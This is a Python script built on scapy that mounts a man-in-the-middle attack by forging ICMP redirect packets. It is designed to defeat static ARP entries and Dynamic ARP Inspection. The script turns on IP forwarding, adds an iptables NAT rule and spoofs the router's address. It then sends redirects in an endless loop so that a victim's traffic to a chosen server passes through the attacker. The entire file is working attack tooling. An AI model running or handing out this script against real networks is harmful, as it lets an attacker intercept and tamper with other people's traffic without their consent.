# MitM against:
#  - static ARP entries
#  - Dynamic ARP inspection

# Prerequisites:
# echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE

import argparse
import random
from ipaddress import ip_address
from optparse import OptionParser
from scapy.all import IP,TCP,ICMP,send
from time import sleep
from signal import signal, SIGINT
from subprocess import call

ip_forwarding = 0
with open("/proc/sys/net/ipv4/ip_forward") as f:
	for line in f:
		ip_forwarding = int(line[0])

def check_SIGINT(signal, frame):
	print("Interrupt keyboard received")
	if not ip_forwarding:
		print("Disabling IP forwarding...")
		call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
	print("Deleting rule...")
	call("iptables -t nat -D POSTROUTING -s {}/{} -o {} -j MASQUERADE".format(options.subnet, options.mask, options.interface), shell=True)
	exit()
signal(SIGINT, check_SIGINT)

parser = OptionParser()
parser.add_option("-p", "--destination-port", dest="dport")
parser.add_option("-r", "--router", dest="router")
parser.add_option("-a", "--attacker", dest="attacker")
parser.add_option("-t", "--target", dest="target")
parser.add_option("-s", "--server", dest="server")
parser.add_option("-S", "--subnet", dest="subnet")
parser.add_option("-M", "--mask", dest="mask")
parser.add_option("-i", "--interface", dest="interface")

(options, args) = parser.parse_args()
for x,y in options.__dict__.items():
	if not y:
		print("Missing {}.".format(x.upper()))
		parser.print_help()
		exit()
	if x != "dport" and x != "interface":
		try:
			ip_address(y)
		except Exception as e:
			print(e)
			exit()
if options.dport.isdigit():
	options.dport = int(options.dport)
	if not (0 <= options.dport <= 65535):
		print("{} is not a valid port number.".format(options.dport))
		exit()
else:
	print("{} is not a valid port number.".format(options.dport))
	exit()

if not ip_forwarding:
	print("Enabling IP forwarding...")
	if call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True):
		exit()
print("Setting postrouting...")
if call("iptables -t nat -A POSTROUTING -s {}/{} -o {} -j MASQUERADE".format(options.subnet, options.mask, options.interface), shell=True):
	exit()

# Creating and sending ICMP redirect packets between these entities:
originalRouterIP = options.router
attackerIP = options.attacker
victimIP = options.target
serverIP = options.server

# Here we create an ICMP Redirect packet
ip = IP()
ip.src = originalRouterIP
ip.dst = victimIP
icmpRedirect = ICMP()
icmpRedirect.type = 5
icmpRedirect.code = 1
icmpRedirect.gw = attackerIP

# The ICMP packet payload /should/ :) contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP = IP()
redirPayloadIP.src = victimIP
redirPayloadIP.dst = serverIP
fakeOriginalTCPSYN = TCP()
fakeOriginalTCPSYN.flags = "S"
fakeOriginalTCPSYN.dport = int(options.dport)
fakeOriginalTCPSYN.seq = random.randrange(444444444, 555555555) # random value
fakeOriginalTCPSYN.sport = random.randrange(40000,65535) # random port above 40000

# Release the Kraken!
while True:
	send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
	sleep(1)